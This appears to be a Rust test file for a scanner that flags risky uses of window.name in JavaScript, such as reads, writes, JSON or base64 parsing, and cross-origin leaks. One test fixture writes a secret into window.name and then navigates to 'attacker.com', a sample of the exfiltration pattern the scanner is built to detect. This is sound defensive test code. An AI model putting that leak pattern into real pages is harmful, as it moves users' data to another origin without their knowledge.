use crate::window_name_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_window_name("");
    assert!(issues.is_empty());
}

#[test]
fn no_window_name_no_issues() {
    let body = "var x = document.title;";
    let issues = analyze_window_name(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_window_name_read() {
    let body = "var data = window.name;";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameRead));
}

#[test]
fn detects_window_name_read_no_space() {
    let body = "var data=window.name;";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameRead));
}

#[test]
fn detects_self_name_read() {
    let body = "var data = self.name;";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameRead));
}

#[test]
fn detects_window_name_in_function() {
    let body = "console.log(window.name);";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameRead));
}

#[test]
fn detects_window_name_write() {
    let body = "window.name = 'secret-data';";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameWrite));
}

#[test]
fn detects_window_name_write_no_space() {
    let body = "window.name='data';";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameWrite));
}

#[test]
fn detects_self_name_write() {
    let body = "self.name = 'data';";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameWrite));
}

#[test]
fn detects_conditional_if() {
    let body = "if (window.name) { doSomething(); }";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameInConditional));
}

#[test]
fn detects_conditional_ternary() {
    let body = "var x = window.name ? window.name : 'default';";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameInConditional));
}

#[test]
fn detects_conditional_and() {
    let body = "window.name && process(window.name);";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameInConditional));
}

#[test]
fn detects_json_parse() {
    let body = "var obj = JSON.parse(window.name);";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameDataParsing));
}

#[test]
fn detects_atob_parsing() {
    let body = "var decoded = atob(window.name);";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameDataParsing));
}

#[test]
fn detects_split_parsing() {
    let body = "var parts = window.name.split('|');";
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameDataParsing));
}

#[test]
fn detects_cross_origin_with_location() {
    let body = r#"
        window.name = secret;
        location.href = 'https://attacker.com';
    "#;
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameCrossOriginLeak));
}

#[test]
fn detects_cross_origin_with_window_open() {
    let body = r#"
        var data = window.name;
        window.open('https://other.com');
    "#;
    let issues = analyze_window_name(body);
    assert!(issues.contains(&WindowNameIssue::WindowNameCrossOriginLeak));
}

#[test]
fn no_cross_origin_without_navigation() {
    let body = "var x = window.name;";
    let issues = analyze_window_name(body);
    assert!(!issues.contains(&WindowNameIssue::WindowNameCrossOriginLeak));
}

#[test]
fn severity_cross_origin_highest() {
    assert_eq!(
        window_name_severity(&WindowNameIssue::WindowNameCrossOriginLeak),
        7.0
    );
}

#[test]
fn severity_read_lowest() {
    assert_eq!(window_name_severity(&WindowNameIssue::WindowNameRead), 4.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        WindowNameIssue::WindowNameRead,
        WindowNameIssue::WindowNameCrossOriginLeak,
    ];
    let mut seq = 0;
    let ops = window_name_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        WindowNameIssue::WindowNameRead.to_string(),
        "window_name_read"
    );
    assert_eq!(
        WindowNameIssue::WindowNameWrite.to_string(),
        "window_name_write"
    );
    assert_eq!(
        WindowNameIssue::WindowNameInConditional.to_string(),
        "window_name_conditional"
    );
    assert_eq!(
        WindowNameIssue::WindowNameDataParsing.to_string(),
        "window_name_data_parsing"
    );
    assert_eq!(
        WindowNameIssue::WindowNameCrossOriginLeak.to_string(),
        "window_name_cross_origin"
    );
}
